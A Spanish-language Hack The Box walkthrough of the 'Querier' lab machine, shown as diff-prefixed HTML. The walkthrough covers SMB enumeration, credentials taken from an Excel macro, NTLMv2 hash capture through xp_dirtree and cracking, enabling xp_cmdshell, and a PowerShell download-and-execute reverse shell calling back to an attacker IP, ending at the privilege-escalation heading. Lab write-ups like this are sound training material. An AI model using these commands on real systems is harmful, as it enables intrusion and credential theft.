-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap smbmap <span class="nt">-H</span> 10.129.67.247 <span class="nt">-u</span> <span class="s1">'null'</span>
-
-    ________  ___      ___  _______   ___      ___       __         _______
-   /<span class="s2">"       )|"</span>  <span class="se">\ </span>   /<span class="s2">"  ||   _  "</span><span class="se">\ </span>|<span class="s2">"  </span><span class="se">\ </span><span class="s2">   /"</span>  |     /<span class="s2">""</span><span class="se">\ </span>      |   __ <span class="s2">"</span><span class="se">\</span><span class="s2">
-  (:   </span><span class="se">\_</span><span class="s2">__/  </span><span class="se">\ </span><span class="s2">  </span><span class="se">\ </span><span class="s2"> //   |(. |_)  :) </span><span class="se">\ </span><span class="s2">  </span><span class="se">\ </span><span class="s2"> //   |    /    </span><span class="se">\ </span><span class="s2">     (. |__) :)
-   </span><span class="se">\_</span><span class="s2">__  </span><span class="se">\ </span><span class="s2">   /</span><span class="se">\ </span><span class="s2"> </span><span class="se">\/</span><span class="s2">.    ||:     </span><span class="se">\/</span><span class="s2">   /</span><span class="se">\ </span><span class="s2">  </span><span class="se">\/</span><span class="s2">.    |   /' /</span><span class="se">\ </span><span class="s2"> </span><span class="se">\ </span><span class="s2">    |:  ____/
-    __/  </span><span class="se">\ </span><span class="s2">  |: </span><span class="se">\.</span><span class="s2">        |(|  _  </span><span class="se">\ </span><span class="s2"> |: </span><span class="se">\.</span><span class="s2">        |  //  __'  </span><span class="se">\ </span><span class="s2">   (|  /
-   /"</span> <span class="se">\ </span>  :<span class="o">)</span> |.  <span class="se">\ </span>   /:  <span class="o">||</span>: |_<span class="o">)</span>  :<span class="o">)</span>|.  <span class="se">\ </span>   /:  | /   /  <span class="se">\ </span>  <span class="se">\ </span> /|__/ <span class="se">\</span>
-  <span class="o">(</span>_______/  |___|<span class="se">\_</span>_/|___|<span class="o">(</span>_______/ |___|<span class="se">\_</span>_/|___|<span class="o">(</span>___/    <span class="se">\_</span>__<span class="o">)(</span>_______<span class="o">)</span>
- <span class="nt">-----------------------------------------------------------------------------</span>
-     SMBMap - Samba Share Enumerator | Shawn Evans - ShawnDEvans@gmail.com
-                     https://github.com/ShawnDEvans/smbmap
-
-<span class="o">[</span><span class="k">*</span><span class="o">]</span> Detected 1 hosts serving SMB
-<span class="o">[</span><span class="k">*</span><span class="o">]</span> Established 1 SMB session<span class="o">(</span>s<span class="o">)</span>
-
-<span class="o">[</span>+] IP: 10.129.67.247:445	Name: 10.129.67.247       	Status: Authenticated
-	Disk                                                  	Permissions	Comment
-	<span class="nt">----</span>                                                  	<span class="nt">-----------</span>	<span class="nt">-------</span>
-	ADMIN<span class="nv">$ </span>                                           	NO ACCESS	Remote Admin
-	C<span class="nv">$ </span>                                               	NO ACCESS	Default share
-	IPC<span class="nv">$ </span>                                             	READ ONLY	Remote IPC
-	Reports                                           	READ ONLY	
-</code></pre></div></div>
-
-<ul>
-  <li>Tenemos capacidad de lectura al recurso <code class="language-plaintext highlighter-rouge">Reports</code> vamos a enumerar lo que esta adentro.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap smbmap <span class="nt">-H</span> 10.129.67.247 <span class="nt">-u</span> <span class="s1">'null'</span> <span class="nt">-r</span> Reports
-
-    ________  ___      ___  _______   ___      ___       __         _______
-   /<span class="s2">"       )|"</span>  <span class="se">\ </span>   /<span class="s2">"  ||   _  "</span><span class="se">\ </span>|<span class="s2">"  </span><span class="se">\ </span><span class="s2">   /"</span>  |     /<span class="s2">""</span><span class="se">\ </span>      |   __ <span class="s2">"</span><span class="se">\</span><span class="s2">
-  (:   </span><span class="se">\_</span><span class="s2">__/  </span><span class="se">\ </span><span class="s2">  </span><span class="se">\ </span><span class="s2"> //   |(. |_)  :) </span><span class="se">\ </span><span class="s2">  </span><span class="se">\ </span><span class="s2"> //   |    /    </span><span class="se">\ </span><span class="s2">     (. |__) :)
-   </span><span class="se">\_</span><span class="s2">__  </span><span class="se">\ </span><span class="s2">   /</span><span class="se">\ </span><span class="s2"> </span><span class="se">\/</span><span class="s2">.    ||:     </span><span class="se">\/</span><span class="s2">   /</span><span class="se">\ </span><span class="s2">  </span><span class="se">\/</span><span class="s2">.    |   /' /</span><span class="se">\ </span><span class="s2"> </span><span class="se">\ </span><span class="s2">    |:  ____/
-    __/  </span><span class="se">\ </span><span class="s2">  |: </span><span class="se">\.</span><span class="s2">        |(|  _  </span><span class="se">\ </span><span class="s2"> |: </span><span class="se">\.</span><span class="s2">        |  //  __'  </span><span class="se">\ </span><span class="s2">   (|  /
-   /"</span> <span class="se">\ </span>  :<span class="o">)</span> |.  <span class="se">\ </span>   /:  <span class="o">||</span>: |_<span class="o">)</span>  :<span class="o">)</span>|.  <span class="se">\ </span>   /:  | /   /  <span class="se">\ </span>  <span class="se">\ </span> /|__/ <span class="se">\</span>
-  <span class="o">(</span>_______/  |___|<span class="se">\_</span>_/|___|<span class="o">(</span>_______/ |___|<span class="se">\_</span>_/|___|<span class="o">(</span>___/    <span class="se">\_</span>__<span class="o">)(</span>_______<span class="o">)</span>
- <span class="nt">-----------------------------------------------------------------------------</span>
-     SMBMap - Samba Share Enumerator | Shawn Evans - ShawnDEvans@gmail.com
-                     https://github.com/ShawnDEvans/smbmap
-
-<span class="o">[</span><span class="k">*</span><span class="o">]</span> Detected 1 hosts serving SMB
-<span class="o">[</span><span class="k">*</span><span class="o">]</span> Established 1 SMB session<span class="o">(</span>s<span class="o">)</span>
-
-<span class="o">[</span>+] IP: 10.129.67.247:445	Name: 10.129.67.247       	Status: Authenticated
-	Disk                                                  	Permissions	Comment
-	<span class="nt">----</span>                                                  	<span class="nt">-----------</span>	<span class="nt">-------</span>
-	ADMIN<span class="nv">$ </span>                                           	NO ACCESS	Remote Admin
-	C<span class="nv">$ </span>                                               	NO ACCESS	Default share
-	IPC<span class="nv">$ </span>                                             	READ ONLY	Remote IPC
-	Reports                                           	READ ONLY	
-	./Reports
-	dr--r--r--                0 Mon Jan 28 17:26:31 2019	<span class="nb">.</span>
-	dr--r--r--                0 Mon Jan 28 17:26:31 2019	..
-	fr--r--r--            12229 Mon Jan 28 17:26:31 2019	Currency Volume Report.xlsm
-</code></pre></div></div>
-
-<ul>
-  <li>Y bueno tenemos un <code class="language-plaintext highlighter-rouge">.xlsm</code>.</li>
-</ul>
-
-<blockquote>
-  <p>El formato de archivo XLSM es parte de la aplicación de hoja de cálculo de Microsoft Excel. Es un formato de archivo de libro de trabajo habilitado para macros que permite a los usuarios almacenar y compartir macros y datos de hojas de cálculo.</p>
-</blockquote>
-
-<ul>
-  <li>Vamos a emplear <code class="language-plaintext highlighter-rouge">smbclient</code> para conectarnos y descargarlo.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  nmap smbclient //10.129.67.247/Reports <span class="nt">-N</span>
-Try <span class="s2">"help"</span> to get a list of possible commands.
-smb: <span class="se">\&gt;</span> <span class="nb">dir</span>
-  <span class="nb">.</span>                                   D        0  Mon Jan 28 17:23:48 2019
-  ..                                  D        0  Mon Jan 28 17:23:48 2019
-  Currency Volume Report.xlsm         A    12229  Sun Jan 27 16:21:34 2019
-
-		5158399 blocks of size 4096. 850432 blocks available
-smb: <span class="se">\&gt;</span> get <span class="s2">"Currency Volume Report.xlsm"</span>
-getting file <span class="se">\C</span>urrency Volume Report.xlsm of size 12229 as Currency Volume Report.xlsm <span class="o">(</span>33.1 KiloBytes/sec<span class="o">)</span> <span class="o">(</span>average 33.1 KiloBytes/sec<span class="o">)</span>
-smb: <span class="se">\&gt;</span>
-</code></pre></div></div>
-
-<ul>
-  <li>
-    <p>Vamos abrirlo con <code class="language-plaintext highlighter-rouge">libreoffice</code>.</p>
-  </li>
-  <li>
-    <p>De primeras no vemos nada.</p>
-  </li>
-</ul>
-
-<p align="center">
-<img src="/assets/hackthebox/img/machines/medium/querier/1.png" />
-</p>
-
-<ul>
-  <li>
-    <p>Pero podemos ver las macros <a href="https://www.xataka.com/basics/macros-excel-que-como-funcionan-como-crearlos">https://www.xataka.com/basics/macros-excel-que-como-funcionan-como-crearlos</a> yéndonos al apartado <code class="language-plaintext highlighter-rouge">Tools</code> y Macros.</p>
-  </li>
-  <li>
-    <p>Podemos ver básicamente una función que se llama <code class="language-plaintext highlighter-rouge">Connect().</code></p>
-  </li>
-</ul>
-
-<p align="center">
-<img src="/assets/hackthebox/img/machines/medium/querier/2.png" />
-</p>
-
-<ul>
-  <li>Se conecta a una base de datos <code class="language-plaintext highlighter-rouge">SQL Server</code> y nos comparten credenciales además de leer el contenido de la tabla <code class="language-plaintext highlighter-rouge">volume</code>.</li>
-</ul>
-
-<table>
-  <thead>
-    <tr>
-      <th>Usuario</th>
-      <th>Contraseña</th>
-    </tr>
-  </thead>
-  <tbody>
-    <tr>
-      <td>reporting</td>
-      <td>PcwTWTHRwryjc$c6</td>
-    </tr>
-  </tbody>
-</table>
-
-<h2 id="shell-as-mssql-svc">Shell as mssql-svc</h2>
-
-<ul>
-  <li>Vamos a validar con <code class="language-plaintext highlighter-rouge">crackmapexec</code>.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content crackmapexec smb 10.129.67.247 <span class="nt">-u</span> reporting <span class="nt">-p</span> <span class="s1">'PcwTWTHRwryjc$c6'</span>
-SMB         10.129.67.247   445    QUERIER          <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 x64 <span class="o">(</span>name:QUERIER<span class="o">)</span> <span class="o">(</span>domain:HTB.LOCAL<span class="o">)</span> <span class="o">(</span>signing:False<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
-SMB         10.129.67.247   445    QUERIER          <span class="o">[</span>-] HTB.LOCAL<span class="se">\r</span>eporting:PcwTWTHRwryjc<span class="nv">$c6</span> STATUS_NO_LOGON_SERVERS
-</code></pre></div></div>
-
-<ul>
-  <li>Bueno si probamos haciéndolo a nivel de <code class="language-plaintext highlighter-rouge">WORKGROUP</code> o autenticación local si nos funciona.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content crackmapexec smb 10.129.67.247 <span class="nt">-u</span> reporting <span class="nt">-p</span> <span class="s1">'PcwTWTHRwryjc$c6'</span> <span class="nt">--local-auth</span>
-SMB         10.129.67.247   445    QUERIER          <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 x64 <span class="o">(</span>name:QUERIER<span class="o">)</span> <span class="o">(</span>domain:QUERIER<span class="o">)</span> <span class="o">(</span>signing:False<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
-SMB         10.129.67.247   445    QUERIER          <span class="o">[</span>+] QUERIER<span class="se">\r</span>eporting:PcwTWTHRwryjc<span class="nv">$c6</span>
-➜  content crackmapexec smb 10.129.67.247 <span class="nt">-u</span> reporting <span class="nt">-p</span> <span class="s1">'PcwTWTHRwryjc$c6'</span> <span class="nt">-d</span> WORKGROUP
-SMB         10.129.67.247   445    QUERIER          <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 x64 <span class="o">(</span>name:QUERIER<span class="o">)</span> <span class="o">(</span>domain:WORKGROUP<span class="o">)</span> <span class="o">(</span>signing:False<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
-SMB         10.129.67.247   445    QUERIER          <span class="o">[</span>+] WORKGROUP<span class="se">\r</span>eporting:PcwTWTHRwryjc<span class="nv">$c6</span>
-</code></pre></div></div>
-
-<ul>
-  <li>Bueno lo que vamos hacer es que como tenemos el puerto <code class="language-plaintext highlighter-rouge">1433/tcp  open  ms-sql-s      Microsoft SQL Server 2017 14.00.1000.00; RTM</code> abierto nos vamos a conectar al servicio.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content impacket-mssqlclient WORKGROUP/reporting@10.129.67.247 <span class="nt">-windows-auth</span>
-Impacket v0.11.0 - Copyright 2023 Fortra
-
-Password:
-<span class="o">[</span><span class="k">*</span><span class="o">]</span> Encryption required, switching to TLS
-<span class="o">[</span><span class="k">*</span><span class="o">]</span> ENVCHANGE<span class="o">(</span>DATABASE<span class="o">)</span>: Old Value: master, New Value: volume
-<span class="o">[</span><span class="k">*</span><span class="o">]</span> ENVCHANGE<span class="o">(</span>LANGUAGE<span class="o">)</span>: Old Value: , New Value: us_english
-<span class="o">[</span><span class="k">*</span><span class="o">]</span> ENVCHANGE<span class="o">(</span>PACKETSIZE<span class="o">)</span>: Old Value: 4096, New Value: 16192
-<span class="o">[</span><span class="k">*</span><span class="o">]</span> INFO<span class="o">(</span>QUERIER<span class="o">)</span>: Line 1: Changed database context to <span class="s1">'volume'</span><span class="nb">.</span>
-<span class="o">[</span><span class="k">*</span><span class="o">]</span> INFO<span class="o">(</span>QUERIER<span class="o">)</span>: Line 1: Changed language setting to us_english.
-<span class="o">[</span><span class="k">*</span><span class="o">]</span> ACK: Result: 1 - Microsoft SQL Server <span class="o">(</span>140 3232<span class="o">)</span>
-<span class="o">[!]</span> Press <span class="nb">help </span><span class="k">for </span>extra shell commands
-SQL <span class="o">(</span>QUERIER<span class="se">\r</span>eporting  reporting@volume<span class="o">)&gt;</span>
-</code></pre></div></div>
-
-<ul>
-  <li>No podemos usar <code class="language-plaintext highlighter-rouge">xp_cmdshell</code> para ejecutar comandos y tampoco podemos activarlo por que no tenemos permisos.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SQL <span class="o">(</span>QUERIER<span class="se">\r</span>eporting  reporting@volume<span class="o">)&gt;</span> xp_cmdshell <span class="s2">"whoami"</span>
-<span class="o">[</span>-] ERROR<span class="o">(</span>QUERIER<span class="o">)</span>: Line 1: The EXECUTE permission was denied on the object <span class="s1">'xp_cmdshell'</span>, database <span class="s1">'mssqlsystemresource'</span>, schema <span class="s1">'sys'</span><span class="nb">.</span>
-SQL <span class="o">(</span>QUERIER<span class="se">\r</span>eporting  reporting@volume<span class="o">)&gt;</span> <span class="nb">enable </span>xp_cmdshell
-<span class="o">[</span>-] ERROR<span class="o">(</span>QUERIER<span class="o">)</span>: Line 1: Incorrect syntax near <span class="s1">'xp_cmdshell'</span><span class="nb">.</span>
-SQL <span class="o">(</span>QUERIER<span class="se">\r</span>eporting  reporting@volume<span class="o">)&gt;</span> enable_xp_cmdshell
-<span class="o">[</span>-] ERROR<span class="o">(</span>QUERIER<span class="o">)</span>: Line 105: User does not have permission to perform this action.
-<span class="o">[</span>-] ERROR<span class="o">(</span>QUERIER<span class="o">)</span>: Line 1: You <span class="k">do </span>not have permission to run the RECONFIGURE statement.
-<span class="o">[</span>-] ERROR<span class="o">(</span>QUERIER<span class="o">)</span>: Line 62: The configuration option <span class="s1">'xp_cmdshell'</span> does not exist, or it may be an advanced option.
-<span class="o">[</span>-] ERROR<span class="o">(</span>QUERIER<span class="o">)</span>: Line 1: You <span class="k">do </span>not have permission to run the RECONFIGURE statement.
-</code></pre></div></div>
-
-<ul>
-  <li>Lo que podemos hacer es roba el hash <code class="language-plaintext highlighter-rouge">NTLMv2</code> en el proceso de la autenticación abusando del <code class="language-plaintext highlighter-rouge">xp_dirtree</code> ya que nos permite listar recursos compartidos a nivel de red de algún servidor y nosotros desde nuestra maquina de atacante con <code class="language-plaintext highlighter-rouge">smbserver</code> vamos a crear un recurso a nivel de red para que se autentique y capturar el hash.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  Downloads impacket-smbserver b <span class="si">$(</span><span class="nb">pwd</span><span class="si">)</span> <span class="nt">-smb2support</span>
-Impacket v0.11.0 - Copyright 2023 Fortra
-
-<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
-<span class="o">[</span><span class="k">*</span><span class="o">]</span> Callback added <span class="k">for </span>UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
-<span class="o">[</span><span class="k">*</span><span class="o">]</span> Callback added <span class="k">for </span>UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
-<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
-<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
-<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
-</code></pre></div></div>
-
-<ul>
-  <li>Ahora si usamos <code class="language-plaintext highlighter-rouge">xp_dirtree</code> para listar los recursos compartidos por detrás viaja la autenticación y capturaremos el hash.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SQL <span class="o">(</span>QUERIER<span class="se">\r</span>eporting  reporting@volume<span class="o">)&gt;</span> xp_dirtree <span class="se">\\</span>10.10.15.11<span class="se">\s</span>mbserver
-subdirectory   depth   file
-<span class="nt">------------</span>   <span class="nt">-----</span>   <span class="nt">----</span>
-SQL <span class="o">(</span>QUERIER<span class="se">\r</span>eporting  reporting@volume<span class="o">)&gt;</span>
-</code></pre></div></div>
-
-<ul>
-  <li>Capturamos el hash.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  Downloads impacket-smbserver b <span class="si">$(</span><span class="nb">pwd</span><span class="si">)</span> <span class="nt">-smb2support</span>
-Impacket v0.11.0 - Copyright 2023 Fortra
-
-<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
-<span class="o">[</span><span class="k">*</span><span class="o">]</span> Callback added <span class="k">for </span>UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
-<span class="o">[</span><span class="k">*</span><span class="o">]</span> Callback added <span class="k">for </span>UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
-<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
-<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
-<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
-<span class="o">[</span><span class="k">*</span><span class="o">]</span> Incoming connection <span class="o">(</span>10.129.67.247,49675<span class="o">)</span>
-<span class="o">[</span><span class="k">*</span><span class="o">]</span> AUTHENTICATE_MESSAGE <span class="o">(</span>QUERIER<span class="se">\m</span>ssql-svc,QUERIER<span class="o">)</span>
-<span class="o">[</span><span class="k">*</span><span class="o">]</span> User QUERIER<span class="se">\m</span>ssql-svc authenticated successfully
-<span class="o">[</span><span class="k">*</span><span class="o">]</span> mssql-svc::QUERIER:aaaaaaaaaaaaaaaa:254a4df4a95e2690a16c8afd14b68f0a:01010000000000008088a8e09187da0102326448f746e93a00000000010010004d007500590056006700510047004600030010004d00750059005600670051004700460002001000530075006f0053006b006d007900540004001000530075006f0053006b006d0079005400070008008088a8e09187da0106000400020000000800300030000000000000000000000000300000b8458b27b9ac92b92824508e47e300b1dd167c58ec5b12b4846757d2eb899f100a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310035002e0031003100000000000000000000000000
-<span class="o">[</span><span class="k">*</span><span class="o">]</span> Connecting Share<span class="o">(</span>1:IPC<span class="nv">$)</span>
-<span class="o">[</span>-] SMB2_TREE_CONNECT not found smbserver
-<span class="o">[</span>-] SMB2_TREE_CONNECT not found smbserver
-<span class="o">[</span><span class="k">*</span><span class="o">]</span> AUTHENTICATE_MESSAGE <span class="o">(</span><span class="se">\,</span>QUERIER<span class="o">)</span>
-<span class="o">[</span><span class="k">*</span><span class="o">]</span> User QUERIER<span class="se">\ </span>authenticated successfully
-<span class="o">[</span><span class="k">*</span><span class="o">]</span> :::00::aaaaaaaaaaaaaaaa
-<span class="o">[</span><span class="k">*</span><span class="o">]</span> Disconnecting Share<span class="o">(</span>1:IPC<span class="nv">$)</span>
-<span class="o">[</span><span class="k">*</span><span class="o">]</span> Closing down connection <span class="o">(</span>10.129.67.247,49675<span class="o">)</span>
-<span class="o">[</span><span class="k">*</span><span class="o">]</span> Remaining connections <span class="o">[]</span>
-</code></pre></div></div>
-
-<ul>
-  <li>Ahora vamos a crackear el hash para ver la contraseña en texto plano.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content john <span class="nt">-w</span>:/usr/share/wordlists/rockyou.txt <span class="nb">hash
-</span>Using default input encoding: UTF-8
-Loaded 1 password <span class="nb">hash</span> <span class="o">(</span>netntlmv2, NTLMv2 C/R <span class="o">[</span>MD4 HMAC-MD5 32/64]<span class="o">)</span>
-Will run 2 OpenMP threads
-Press <span class="s1">'q'</span> or Ctrl-C to abort, almost any other key <span class="k">for </span>status
-corporate568     <span class="o">(</span>mssql-svc<span class="o">)</span>
-1g 0:00:00:42 DONE <span class="o">(</span>2024-04-05 13:48<span class="o">)</span> 0.02369g/s 212247p/s 212247c/s 212247C/s correforenz..corococo
-Use the <span class="s2">"--show --format=netntlmv2"</span> options to display all of the cracked passwords reliably
-Session completed.
-</code></pre></div></div>
-
-<ul>
-  <li>Vamos a validar que la contraseña es valida.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content crackmapexec smb 10.129.67.247 <span class="nt">-u</span> <span class="s1">'mssql-svc'</span> <span class="nt">-p</span> <span class="s1">'corporate568'</span> <span class="nt">--local-auth</span>
-SMB         10.129.67.247   445    QUERIER          <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 x64 <span class="o">(</span>name:QUERIER<span class="o">)</span> <span class="o">(</span>domain:QUERIER<span class="o">)</span> <span class="o">(</span>signing:False<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
-SMB         10.129.67.247   445    QUERIER          <span class="o">[</span>+] QUERIER<span class="se">\m</span>ssql-svc:corporate568
-</code></pre></div></div>
-
-<ul>
-  <li>Como el usuario se llama <code class="language-plaintext highlighter-rouge">mssql-svc</code> nos podemos conectar a <code class="language-plaintext highlighter-rouge">mssql</code> también.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content impacket-mssqlclient WORKGROUP/mssql-svc@10.129.67.247 <span class="nt">-windows-auth</span>
-Impacket v0.11.0 - Copyright 2023 Fortra
-
-Password:
-<span class="o">[</span><span class="k">*</span><span class="o">]</span> Encryption required, switching to TLS
-<span class="o">[</span><span class="k">*</span><span class="o">]</span> ENVCHANGE<span class="o">(</span>DATABASE<span class="o">)</span>: Old Value: master, New Value: master
-<span class="o">[</span><span class="k">*</span><span class="o">]</span> ENVCHANGE<span class="o">(</span>LANGUAGE<span class="o">)</span>: Old Value: , New Value: us_english
-<span class="o">[</span><span class="k">*</span><span class="o">]</span> ENVCHANGE<span class="o">(</span>PACKETSIZE<span class="o">)</span>: Old Value: 4096, New Value: 16192
-<span class="o">[</span><span class="k">*</span><span class="o">]</span> INFO<span class="o">(</span>QUERIER<span class="o">)</span>: Line 1: Changed database context to <span class="s1">'master'</span><span class="nb">.</span>
-<span class="o">[</span><span class="k">*</span><span class="o">]</span> INFO<span class="o">(</span>QUERIER<span class="o">)</span>: Line 1: Changed language setting to us_english.
-<span class="o">[</span><span class="k">*</span><span class="o">]</span> ACK: Result: 1 - Microsoft SQL Server <span class="o">(</span>140 3232<span class="o">)</span>
-<span class="o">[!]</span> Press <span class="nb">help </span><span class="k">for </span>extra shell commands
-SQL <span class="o">(</span>QUERIER<span class="se">\m</span>ssql-svc  dbo@master<span class="o">)&gt;</span>
-</code></pre></div></div>
-
-<ul>
-  <li>Ahora simplemente tenemos que habilitarlo para poder usar el <code class="language-plaintext highlighter-rouge">xp_cmdshell</code>.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SQL <span class="o">(</span>QUERIER<span class="se">\m</span>ssql-svc  dbo@master<span class="o">)&gt;</span> xp_cmdshell <span class="s2">"whoami"</span>
-<span class="o">[</span>-] ERROR<span class="o">(</span>QUERIER<span class="o">)</span>: Line 1: SQL Server blocked access to procedure <span class="s1">'sys.xp_cmdshell'</span> of component <span class="s1">'xp_cmdshell'</span> because this component is turned off as part of the security configuration <span class="k">for </span>this server. A system administrator can <span class="nb">enable </span>the use of <span class="s1">'xp_cmdshell'</span> by using sp_configure. For more information about enabling <span class="s1">'xp_cmdshell'</span>, search <span class="k">for</span> <span class="s1">'xp_cmdshell'</span> <span class="k">in </span>SQL Server Books Online.
-</code></pre></div></div>
-
-<ul>
-  <li>Vemos que ahora cambia a 1 ya podemos usarlo.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SQL <span class="o">(</span>QUERIER<span class="se">\m</span>ssql-svc  dbo@master<span class="o">)&gt;</span> enable_xp_cmdshell
-<span class="o">[</span><span class="k">*</span><span class="o">]</span> INFO<span class="o">(</span>QUERIER<span class="o">)</span>: Line 185: Configuration option <span class="s1">'show advanced options'</span> changed from 0 to 1. Run the RECONFIGURE statement to install.
-<span class="o">[</span><span class="k">*</span><span class="o">]</span> INFO<span class="o">(</span>QUERIER<span class="o">)</span>: Line 185: Configuration option <span class="s1">'xp_cmdshell'</span> changed from 0 to 1. Run the RECONFIGURE statement to install.
-SQL <span class="o">(</span>QUERIER<span class="se">\m</span>ssql-svc  dbo@master<span class="o">)&gt;</span>
-</code></pre></div></div>
-
-<ul>
-  <li>Ahora ya podemos ejecutar comandos.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SQL <span class="o">(</span>QUERIER<span class="se">\m</span>ssql-svc  dbo@master<span class="o">)&gt;</span> xp_cmdshell <span class="s2">"whoami"</span>
-output
-<span class="nt">-----------------</span>
-querier<span class="se">\m</span>ssql-svc
-
-NULL
-
-SQL <span class="o">(</span>QUERIER<span class="se">\m</span>ssql-svc  dbo@master<span class="o">)&gt;</span>
-</code></pre></div></div>
-
-<ul>
-  <li>
-    <p>Ahora podemos ganar acceso ala maquina empleando lo siguiente <a href="https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1">https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1</a>.</p>
-  </li>
-  <li>
-    <p>Vamos a modificar el script para entablarnos una <code class="language-plaintext highlighter-rouge">reverse shell</code> directamente.</p>
-  </li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content <span class="nb">echo</span> <span class="s1">'Invoke-PowerShellTcp -Reverse -IPAddress 10.10.15.11 -Port 443'</span> <span class="o">&gt;&gt;</span> Invoke-PowerShellTcp.ps1
-➜  content <span class="nb">cat </span>Invoke-PowerShellTcp.ps1 | <span class="nb">tail</span> <span class="nt">-n</span> 1
-Invoke-PowerShellTcp <span class="nt">-Reverse</span> <span class="nt">-IPAddress</span> 10.10.15.11 <span class="nt">-Port</span> 443
-</code></pre></div></div>
-
-<ul>
-  <li>Vamos a ejecutar un servicio <code class="language-plaintext highlighter-rouge">http</code> con <code class="language-plaintext highlighter-rouge">python3</code> por el puerto <code class="language-plaintext highlighter-rouge">80</code>.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content python3 <span class="nt">-m</span> http.server 80
-Serving HTTP on 0.0.0.0 port 80 <span class="o">(</span>http://0.0.0.0:80/<span class="o">)</span> ...
-</code></pre></div></div>
-
-<ul>
-  <li>Y ahora nos podemos en escucha por el puerto 443 para que nos llegue la <code class="language-plaintext highlighter-rouge">reverse shell</code>.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content rlwrap nc <span class="nt">-nvlp</span> 443
-listening on <span class="o">[</span>any] 443 ...
-</code></pre></div></div>
-
-<ul>
-  <li>Ahora usamos el <code class="language-plaintext highlighter-rouge">xp_cmdshell</code>.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SQL <span class="o">(</span>QUERIER<span class="se">\m</span>ssql-svc  dbo@master<span class="o">)&gt;</span> xp_cmdshell <span class="s2">"powershell IEX(New-Object Net.WebClient).downloadString(</span><span class="se">\"</span><span class="s2">http://10.10.15.11/Invoke-PowerShellTcp.ps1</span><span class="se">\"</span><span class="s2">)"</span>
-</code></pre></div></div>
-
-<ul>
-  <li>Nos llega la <code class="language-plaintext highlighter-rouge">reverse shell</code>.</li>
-</ul>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content rlwrap nc <span class="nt">-nvlp</span> 443
-listening on <span class="o">[</span>any] 443 ...
-connect to <span class="o">[</span>10.10.15.11] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.129.67.247] 49677
-Windows PowerShell running as user mssql-svc on QUERIER
-Copyright <span class="o">(</span>C<span class="o">)</span> 2015 Microsoft Corporation. All rights reserved.
-
-PS C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;whoami
-querier<span class="se">\m</span>ssql-svc
-PS C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;
-</code></pre></div></div>
-
-<h2 id="user-flag">User flag</h2>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt; <span class="nb">type </span>C:<span class="se">\U</span>sers<span class="se">\m</span>ssql-svc<span class="se">\D</span>esktop<span class="se">\u</span>ser.txt
-e96e197911a391c99a71cd3596542670
-PS C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;
-</code></pre></div></div>
-
-<h2 id="escalada-de-privilegios">Escalada de Privilegios</h2>
-
-<ul>
